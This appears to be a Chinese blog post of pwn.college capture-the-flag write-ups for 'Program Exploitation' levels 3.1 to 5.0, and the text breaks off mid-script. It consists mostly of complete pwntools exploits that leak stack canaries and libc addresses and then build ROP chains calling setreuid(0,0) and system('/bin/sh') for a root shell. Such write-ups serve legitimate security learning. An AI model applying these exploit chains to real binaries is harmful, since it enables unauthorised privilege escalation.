

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/Pi.png">
  <link rel="icon" href="/img/Pi.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Lobo Q1ng">
  <meta name="keywords" content="">
  
    <meta name="description" content="Hello~，hackers Program Exploitation的writeup Level 3.1一个完整的ROP题，先泄露canary，再泄露main基地址，然后通过main基地址使用puts(puts)泄露libc基地址。最后构造ROP链即可。exp如下： 12345678910111213141516171819202122232425262728293031323334353637">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn.college: Program Exploitation">
<meta property="og:url" content="https://loboq1ng.github.io/2025/05/11/pwn-college-Program-Exploitation/index.html">
<meta property="og:site_name" content="Q1ng&#39;s blog">
<meta property="og:description" content="Hello~，hackers Program Exploitation的writeup Level 3.1一个完整的ROP题，先泄露canary，再泄露main基地址，然后通过main基地址使用puts(puts)泄露libc基地址。最后构造ROP链即可。exp如下： 12345678910111213141516171819202122232425262728293031323334353637">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://loboq1ng.github.io/2025/05/11/pwn-college-Program-Exploitation/image-20250510165156844.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/05/11/pwn-college-Program-Exploitation/image-20250510203051677.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/05/11/pwn-college-Program-Exploitation/image-20250510174719065.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/05/11/pwn-college-Program-Exploitation/image-20250510203642334.png">
<meta property="og:image" content="https://loboq1ng.github.io/2025/05/11/pwn-college-Program-Exploitation/image-20250510175736371.png">
<meta property="article:published_time" content="2025-05-11T08:18:50.000Z">
<meta property="article:modified_time" content="2025-05-12T02:45:34.716Z">
<meta property="article:author" content="Lobo Q1ng">
<meta property="article:tag" content="Pwn">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://loboq1ng.github.io/2025/05/11/pwn-college-Program-Exploitation/image-20250510165156844.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>pwn.college: Program Exploitation - Q1ng&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"loboq1ng.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Q1ng&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/pwn_college.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="pwn.college: Program Exploitation"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-05-11 16:18" pubdate>
          2025年5月11日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          7.8k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          98 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span>次
        </span>
        

      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">pwn.college: Program Exploitation</h1>
            
            
              <div class="markdown-body">
                
                <p>Hello~，hackers</p>
<p>Program Exploitation的writeup</p>
<h1 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3.1"></a>Level 3.1</h1><p>一个完整的ROP题，先泄露canary，再泄露main基地址，然后通过main基地址使用<code>puts(puts)</code>泄露libc基地址。最后构造ROP链即可。exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/toddlerone-level-3-1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><span class="hljs-comment"># leak ret_to_main_addr</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;88&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">82</span> + <span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>ret_to_main_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ret_to_main_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(ret_to_main_addr))<br>main_base_addr = ret_to_main_addr - <span class="hljs-number">0x2220</span><br><br><br><span class="hljs-comment"># leak canary</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;73&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">67</span> + <span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>canary = u64(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br><br><span class="hljs-comment"># puts(puts)</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;136&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>challenge_addr = main_base_addr+<span class="hljs-number">0x1fc4</span><br>e = p.elf<br>e.address = main_base_addr<br>r = ROP(e)<br>r.raw(r.rdi) <span class="hljs-comment"># pop rdi; ret</span><br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(challenge_addr)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">72</span> + p64(canary) + p64(<span class="hljs-number">0xdeadbeef</span>) +r.chain())<br>p.recvuntil(<span class="hljs-string">b&quot;Goodbye!\n&quot;</span>)<br>puts_got_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br>libc_base = puts_got_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base:&quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># ROP</span><br>libc.address = libc_base<br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-comment"># print(len(rop.chain()))</span><br><br><span class="hljs-comment"># overwrite</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;152&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">72</span> + p64(canary) + p64(<span class="hljs-number">0xdeadbeef</span>) +rop.chain())<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="level-4-1"><a href="#level-4-1" class="headerlink" title="level 4.1"></a>level 4.1</h1><p>在payload中增加一步，即padding的最后8个字节为指定<code>magic number</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/toddlerone-level-4-1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br><span class="hljs-comment"># leak ret_to_main_addr</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;104&quot;</span>                                            <span class="hljs-comment"># ***</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">98</span> + <span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>ret_to_main_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ret_to_main_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(ret_to_main_addr))<br>main_base_addr = ret_to_main_addr - <span class="hljs-number">0x1d43</span>              <span class="hljs-comment"># ***</span><br><br><br><span class="hljs-comment"># leak canary</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;89&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">83</span> + <span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>canary = u64(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br><br><span class="hljs-comment"># puts(puts)</span><br>condition = <span class="hljs-number">0xD355EFB4BF7A0170</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;136&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>challenge_addr = main_base_addr+<span class="hljs-number">0x1ad5</span>          <span class="hljs-comment"># ***</span><br>e = p.elf<br>e.address = main_base_addr<br>r = ROP(e)<br>r.raw(r.rdi) <span class="hljs-comment"># pop rdi; ret</span><br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(challenge_addr)<br><span class="hljs-comment"># print(len(r.chain()))</span><br>pause()<br>p.send(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">80</span> + p64(condition) + p64(canary) + p64(<span class="hljs-number">0xdeadbeef</span>) + r.chain())<br>p.recvuntil(<span class="hljs-string">b&quot;exit() condition avoided! Continuing execution.\n&quot;</span>)<br>puts_got_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br>libc_base = puts_got_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base:&quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># ROP</span><br>libc.address = libc_base<br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;binsh_addr&quot;</span>, <span class="hljs-built_in">hex</span>(binsh_addr))<br>rop = ROP(libc)<br>ruid = <span class="hljs-number">0</span>    <span class="hljs-comment"># 其实只需要ruid为0就能够拿到root shell</span><br>euid = <span class="hljs-number">0</span><br><span class="hljs-comment"># rop.raw(rop.ret)</span><br>rop.raw(rop.rdi)<br>rop.raw(ruid)<br>rop.raw(rop.rsi)<br>rop.raw(euid)<br>rop.raw(setreuid_addr)<br>rop.raw(rop.rdi)<br>rop.raw(binsh_addr)<br>rop.raw(sys_addr)<br><span class="hljs-comment"># print(len(rop.chain()))</span><br><br><span class="hljs-comment"># overwrite</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;168&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">80</span> + p64(condition) + p64(canary) + p64(<span class="hljs-number">0xdeadbeef</span>) +rop.chain())<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="level-5-0"><a href="#level-5-0" class="headerlink" title="level 5.0"></a>level 5.0</h1><p><code>Canary</code>的栈帧位置<strong>不一定是<code>rbp-8</code></strong>，可能因编译环境、函数复杂度或优化选项而变化。实际位置需通过反汇编或调试确认。</p>
<p>这里我们发现canary在<code>rbp-0x18</code>处，同时condition在<code>rbp-0x28</code>处。也就是说，rbp距离canary中间间隔<code>0x10</code>字节，canary和condition中间间隔<code>0x8</code>字节</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/toddlerone-level-5-0&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br><br><span class="hljs-comment"># leak ret_to_main_addr</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;104&quot;</span>                                            <span class="hljs-comment"># ***</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">98</span> + <span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>ret_to_main_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ret_to_main_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(ret_to_main_addr))<br>main_base_addr = ret_to_main_addr - <span class="hljs-number">0x22b6</span>              <span class="hljs-comment"># ***</span><br><br><span class="hljs-comment"># leak canary</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;73&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br><span class="hljs-comment"># pause()</span><br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">67</span> + <span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;REPEAT&quot;</span>)<br>canary = u64(p.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;canary:&quot;</span>, <span class="hljs-built_in">hex</span>(canary))<br><br><span class="hljs-comment"># puts(puts)</span><br>condition = <span class="hljs-number">0x725271A4BD26531A</span><br>p.recvuntil(<span class="hljs-string">b&quot;Payload size: &quot;</span>)<br>size = <span class="hljs-string">&quot;136&quot;</span><br>p.sendline(size.encode())<br>p.recvuntil(<span class="hljs-string">b&quot;bytes)!\n&quot;</span>)<br>challenge_addr = main_base_addr+<span class="hljs-number">0x1bad</span>          <span class="hljs-comment"># ***</span><br>e = p.elf<br>e.address = main_base_addr<br>r = ROP(e)<br>r.raw(r.rdi) <span class="hljs-comment"># pop rdi; ret</span><br>r.raw(e.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>r.raw(challenge_addr)<br><span class="hljs-comment"># print(len(r.chain()))</span><br>pause()<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">56</span> + p64(condition) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span> + p64(canary) + <span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0xdeadbeef</span>) + r.chain())<br>p.recvuntil(<span class="hljs-string">b&quot;Goodbye!\n&quot;</span>)<br>puts_got_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))<br>libc_base = puts_got_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base:&quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># ROP</span><br>libc.address = libc_base<br>sys_addr = libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh_addr = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>setreuid_addr = libc.symbols[<span class="hljs-string">&#x27;setreuid&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;setreuid_addr&quot;</span>, <span class="hljs-built_in">hex</span>(setreuid_addr))<br><span class="hljs-built_in">print</span>(<span 